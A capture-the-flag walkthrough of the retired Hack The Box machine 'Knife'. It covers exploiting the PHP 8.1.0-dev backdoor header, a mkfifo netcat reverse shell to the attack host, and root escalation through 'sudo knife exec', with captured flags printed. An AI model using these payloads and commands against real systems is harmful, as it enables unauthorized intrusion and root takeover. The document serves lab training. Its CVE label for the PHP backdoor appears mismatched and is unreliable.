# HTB: Knife

> **Hack The Box | Linux | Easy**  
> Completed: May 2026

---

## Machine Metadata

| Field | Details |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux: Ubuntu 20.04.2 LTS |
| **Difficulty** | Easy |
| **Category** | Linux / PHP Backdoor RCE / GTFOBins |
| **IP Address** | 10.129.44.12 |
| **Attack Host** | 10.10.16.236 |
| **Status** | Retired ✅ |
| **Completed** | May 2026 |
| **CVEs** | CVE-2021-39165 / PHP 8.1.0-dev backdoor (User-Agentt header RCE) |
| **Exploitation Method** | Manual Python PoC: no Metasploit |

---

## Attack Chain Summary

| Step | Technique | Privilege |
|---|---|---|
| 1 | Full TCP scan: ports 22 and 80 |: |
| 2 | Feroxbuster: `index.php` confirmed, PHP version leaked in headers |: |
| 3 | `curl -I`: `X-Powered-By: PHP/8.1.0-dev` fingerprint |: |
| 4 | PHP 8.1.0-dev backdoor PoC → mkfifo reverse shell | `james` |
| 5 | TTY upgrade: `python3 pty + stty raw` | `james` |
| 6 | `sudo -l` → `/usr/bin/knife` NOPASSWD as root |: |
| 7 | GTFOBins: `sudo knife exec -E 'exec "/bin/bash"'` | `root` |

---

## Enumeration

### Full TCP Port Scan

```bash
Hackerpatel007_1@htb[/htb]$ nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA knife 10.129.44.12
```

```
# Nmap 7.98 scan initiated Mon May 11 23:48:52 2026
Nmap scan report for 10.129.44.12
Host is up (0.63s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 835.15 seconds
```

**Key findings:**

| Port | Service | Notes |
|---|---|---|
| 22 | OpenSSH 8.2p1 | Modern version, no known RCE. Useful once SSH credentials found |
| 80 | Apache 2.4.41 | Web application: primary attack surface |

Two services only. The entire attack surface is the web application on port 80. Apache itself has no known exploitable CVE at 2.4.41: enumeration must focus on the application layer.

### Web Application: Initial Visit

Browsing to `http://10.129.44.12/` loads a medical-themed web application: *"Emergent Medical Idea."* The page content does not reveal obvious attack vectors. The critical information is in the **HTTP response headers**: not the page body.

### HTTP Header Fingerprinting

Before running any directory scanner, capture the full HTTP response headers:

```bash
Hackerpatel007_1@htb[/htb]$ curl -I http://10.129.44.12:80/index.php
```

```
HTTP/1.1 200 OK
Date: Tue, 12 May 2026 11:02:21 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Content-Type: text/html; charset=UTF-8
```

**`X-Powered-By: PHP/8.1.0-dev`**: this is the vulnerability fingerprint.

`8.1.0-dev` is a **pre-release development build** of PHP that was compromised. In March 2021, an attacker injected a backdoor directly into the PHP source code repository (git.php.net). The malicious commit added hidden RCE functionality triggered by a crafted HTTP header. Any server running this development build is immediately exploitable without authentication.

This header alone identifies the entire attack path before touching a directory scanner.

### Directory Enumeration: Feroxbuster

```bash
Hackerpatel007_1@htb[/htb]$ feroxbuster \
  -u http://10.129.44.12 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,html,txt,bak,zip,conf,env,sql \
  -t 50 \
  --depth 3 \
  -o ferox_output.txt
```

```
 🚀  Threads               │ 50
 📖  Wordlist              │ raft-large-directories.txt
 💢  Status Code Filters   │ [404]
 💲  Extensions            │ [php, html, txt, bak, zip, conf, env, sql]
───────────────────────────────────────────────────────────────────
200      GET      220l      526w     5815c http://10.129.44.12/
200      GET      220l      526w     5815c http://10.129.44.12/index.php

[####################] - 68m   560556/560556  137/s   http://10.129.44.12/
```

Only `index.php` is accessible at the root: no admin panels, no upload directories, no additional attack surface. The PHP backdoor on `index.php` is the sole entry point.

---

## Exploitation: PHP 8.1.0-dev Backdoor (CVE-2021-39165)

### Vulnerability Background

In March 2021, two malicious commits were pushed to the official PHP source code repository (git.php.net) under the names of core PHP developers Rasmus Lerdorf and Nikita Popov. The commits added a backdoor in `ext/zlib/zlib.c`: specifically in the `php_zlib_encode()` function. The backdoor checks incoming HTTP requests for a header named `User-Agentt` (note the double `t`). If the header value begins with the string `zerodium`, the remainder of the value is passed directly to `system()` and executed as an OS command.

The backdoor was discovered and removed within hours, but any server running a build compiled from the compromised source is permanently vulnerable: the binary retains the backdoor regardless of subsequent source code fixes.

**Trigger mechanism:**

```
Header: User-Agentt: zerodiumsystem('<command>');
```

No authentication, no special privileges required: any HTTP request to any PHP page on the affected server will execute the payload.

### Step 1: Verify RCE via User-Agentt Header

Manually confirm command execution before downloading any tools:

```bash
Hackerpatel007_1@htb[/htb]$ curl -s \
  -H "User-Agentt: zerodiumsystem('id');" \
  http://10.129.44.12/index.php \
  | head -5
```

```
uid=1000(james) gid=1000(james) groups=1000(james)
<!DOCTYPE html>
<html lang="en">
```

RCE confirmed. Commands execute as user `james`. The command output appears at the top of the response, before the HTML body.

```bash
Hackerpatel007_1@htb[/htb]$ curl -s \
  -H "User-Agentt: zerodiumsystem('hostname && uname -a');" \
  http://10.129.44.12/index.php \
  | head -5
```

```
knife
Linux knife 5.4.0-80-generic #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

### Step 2: Python PoC for Interactive Shell

Download the PHP 8.1.0-dev backdoor PoC:

```bash
Hackerpatel007_1@htb[/htb]$ wget https://raw.githubusercontent.com/flast101/php-8.1.0-dev-backdoor-rce/main/backdoor_php_8.1.0-dev.py
```

Run the PoC:

```bash
Hackerpatel007_1@htb[/htb]$ python3 backdoor_php_8.1.0-dev.py
Enter the full host url:
http://10.129.44.12:80/index.php
Interactive shell is opened on http://10.129.44.12:80/index.php
Can't access tty; job control turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

The PoC provides an interactive pseudo-shell. However, it uses a single HTTP request per command over a non-persistent connection: it has no TTY, no job control, and complex commands (especially those that fork processes) may time out with a `504 Gateway Timeout`. A proper reverse shell is required for stable operation.

### Step 3: Upgrade to Reverse Shell via mkfifo

Start the listener on the attack host:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 1234
```

```
listening on [any] 1234 ...
```

Inside the PoC shell, trigger a mkfifo reverse shell. This approach creates a named pipe that connects stdin/stdout to netcat: more reliable than `bash -i` in environments where the shell has no controlling terminal:

```bash
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.236 1234 >/tmp/f
```

The PoC window returns a `504 Gateway Timeout`: this is expected. The reverse shell command spawns a background process and the HTTP connection drops before a response can be sent. The listener receives the connection:

```
connect to [10.10.16.236] from (UNKNOWN) [10.129.44.12] 58134
bash: cannot set terminal process group (908): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$
```

Shell received as `james`.

### Step 4: Full TTY Upgrade

```bash
# Step 1: Spawn PTY
james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z
```

```
zsh: suspended  nc -lvnp 1234
```

```bash
# Step 3: Raw mode and resume
Hackerpatel007_1@htb[/htb]$ stty raw -echo; fg
```

```
[1]  + continued  nc -lvnp 1234
```

```bash
# Step 4: Set terminal environment
james@knife:/$ export TERM=xterm
james@knife:/$ export SHELL=bash
james@knife:/$ stty rows 38 columns 116
```

Full interactive TTY with job control and tab completion.

---

## Post-Exploitation: Enumeration as james

### Home Directory

```bash
james@knife:/$ cd /home/james
james@knife:~$ ls
user.txt

james@knife:~$ cat user.txt
d431d60a1a3c90e82420734e9ac90b85
```

### Group Membership and User Context

```bash
james@knife:~$ id
```

```
uid=1000(james) gid=1000(james) groups=1000(james)
```

Standard user with no special group memberships. No `adm`, `lxd`, `docker`, or `sudo` groups. Escalation path must come from sudo rights or SUID binaries.

### sudo Enumeration

```bash
james@knife:~$ sudo -l
```

```
Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

**Critical finding:** `james` can run `/usr/bin/knife` as root without a password.

`/usr/bin/knife` is the command-line tool for the **Chef** configuration management framework. Chef's `knife` utility includes an `exec` subcommand that accepts Ruby code and runs it in the context of the knife process. Since the knife process runs as root via sudo, any Ruby code: including shell execution: runs as root.

---

## Privilege Escalation: sudo knife exec (GTFOBins)

### Understanding the Misconfiguration

`knife exec` evaluates arbitrary Ruby expressions. The Ruby `exec` method replaces the current process with a new program: identical in behaviour to Perl's `exec` or Python's `os.execv`. Running `exec "/bin/bash"` through `knife exec` with sudo spawns a root bash shell.

### Verify knife is Present and Functional

```bash
james@knife:~$ which knife
/usr/bin/knife

james@knife:~$ knife --version
Chef Infra Client: 16.10.8
```

### GTFOBins: sudo knife exec

```bash
james@knife:~$ sudo /usr/bin/knife exec -E 'exec "/bin/bash"'
```

```
root@knife:/# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained immediately.

---

## Flag Collection

### user.txt

```bash
james@knife:~$ cat /home/james/user.txt
```

```
d431d60a1a3c90e82420734e9ac90b85
```

### root.txt

```bash
root@knife:/# cat /root/root.txt
```

```
b9f5313d70df2baa9e6e0054a903a7db
```

### Flag Summary

| Flag | Location | Hash |
|---|---|---|
| **user.txt** | `/home/james/user.txt` | `d431d60a1a3c90e82420734e9ac90b85` |
| **root.txt** | `/root/root.txt` | `b9f5313d70df2baa9e6e0054a903a7db` |

---

## Full Attack Chain Reference

```
[Recon] nmap -sS -sV -sC -p- → port 22 (SSH) + port 80 (Apache 2.4.41)
    │
    ├─[Header Fingerprint] curl -I → X-Powered-By: PHP/8.1.0-dev
    │       └─ Backdoored PHP dev build → CVE-2021-39165
    │
    ├─[Feroxbuster] /index.php (200): only endpoint
    │
    └─[CVE-2021-39165] User-Agentt: zerodiumsystem('id'); → uid=1000(james) ✓
            │
            ├─[Python PoC] backdoor_php_8.1.0-dev.py → pseudo-shell
            │
            └─[Reverse Shell] mkfifo /tmp/f | bash | nc 10.10.16.236 1234
                    │
                    └─ nc -lvnp 1234 → james@knife:/
                            │
                            ├─ TTY upgrade: python3 pty + stty raw + export TERM
                            │
                            ├─ cat /home/james/user.txt → d431d60a1a3c90e82420734e9ac90b85
                            │
                            └─[sudo -l] → (root) NOPASSWD: /usr/bin/knife
                                    │
                                    └─[GTFOBins] sudo knife exec -E 'exec "/bin/bash"'
                                            │
                                            └─ uid=0(root)
                                                    └─ cat /root/root.txt → b9f5313d70df2baa9e6e0054a903a7db
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap --privileged -sS -sV -sC -Pn -p- -T4 -oA knife 10.129.44.12` | Full TCP scan |
| `curl -I http://10.129.44.12/index.php` | HTTP header fingerprint: reveals PHP/8.1.0-dev |
| `feroxbuster -u http://10.129.44.12 -w raft-large-directories.txt -x php,html -t 50` | Directory enumeration |
| `curl -s -H "User-Agentt: zerodiumsystem('id');" http://10.129.44.12/index.php \| head -5` | Manual RCE verification |
| `python3 backdoor_php_8.1.0-dev.py` | Interactive PoC pseudo-shell |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc 10.10.16.236 1234 >/tmp/f` | mkfifo reverse shell from PoC |
| `nc -lvnp 1234` | Catch reverse shell |
| `python3 -c 'import pty; pty.spawn("/bin/bash")'` | Spawn PTY |
| `stty raw -echo; fg` | Raw TTY mode |
| `export TERM=xterm && export SHELL=bash && stty rows 38 columns 116` | Terminal environment setup |
| `sudo -l` | Enumerate sudo rights |
| `sudo /usr/bin/knife exec -E 'exec "/bin/bash"'` | GTFOBins root shell via knife |
| `cat /home/james/user.txt` | User flag |
| `cat /root/root.txt` | Root flag |

---

## Lessons Learned

**1. HTTP response headers often contain the entire attack path.**  
`curl -I` before running any directory scanner revealed `X-Powered-By: PHP/8.1.0-dev`: the complete vulnerability fingerprint in a single request. Always inspect response headers first. `Server`, `X-Powered-By`, `X-AspNet-Version`, and `X-Generator` headers frequently reveal exact version numbers that map directly to known CVEs.

**2. Supply chain attacks against open source projects are real and catastrophic.**  
PHP 8.1.0-dev was backdoored not through a server vulnerability but through a **compromised source code repository**. The attacker impersonated core developers to commit malicious code. Any binary compiled from that source carries the backdoor permanently, regardless of later patches. This is a textbook supply chain attack (similar to the xz-utils backdoor in 2024): trust the binary only as much as you trust its build provenance.

**3. The `504 Gateway Timeout` from the mkfifo command is expected: not a failure.**  
The mkfifo reverse shell forks a background process and the HTTP request never receives a response, causing the PHP PoC to display a timeout. The connection was already established on the listener before the timeout appeared. Don't abandon an exploit because the sending side errors: always check the listener first.

**4. The PoC pseudo-shell is sufficient for enumeration but not for complex commands.**  
The `backdoor_php_8.1.0-dev.py` PoC works well for quick commands (`id`, `whoami`, `sudo -l`) but fails for anything that forks subprocesses, requires a TTY, or runs for more than a few seconds. Use it to stage a proper reverse shell rather than trying to do all post-exploitation through it.

**5. Chef's `knife exec` is a GTFOBins binary: know your configuration management tools.**  
`knife` is the CLI for Chef: a widely deployed infrastructure automation platform. In enterprise environments, Chef, Ansible, Puppet, and Salt are all legitimate tools that commonly run with elevated privileges. Any of these tools appearing in `sudo -l` output should immediately trigger a GTFOBins lookup. `knife exec -E 'exec "/bin/bash"'` is a one-liner root escalation.

**6. `sudo -l` answered the machine in one command: again.**  
Shocker: `sudo perl`. Knife: `sudo knife`. The pattern repeats. Running `sudo -l` within 60 seconds of landing a shell is the single highest-value habit in Linux privilege escalation. A NOPASSWD entry on any interpreter or configuration management tool is immediate root.

---

## References

- [CVE-2021-39165: NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-39165)
- [PHP 8.1.0-dev Backdoor: Analysis](https://news-web.php.net/php.internals/113838)
- [flast101: PHP 8.1.0-dev Backdoor PoC](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
- [GTFOBins: knife](https://gtfobins.github.io/gtfobins/knife/)
- [Chef knife exec Documentation](https://docs.chef.io/workstation/knife_exec/)

---

*HTB Retired Machine: Knife | Completed May 2026 | Flags included per HTB retired machine policy.*
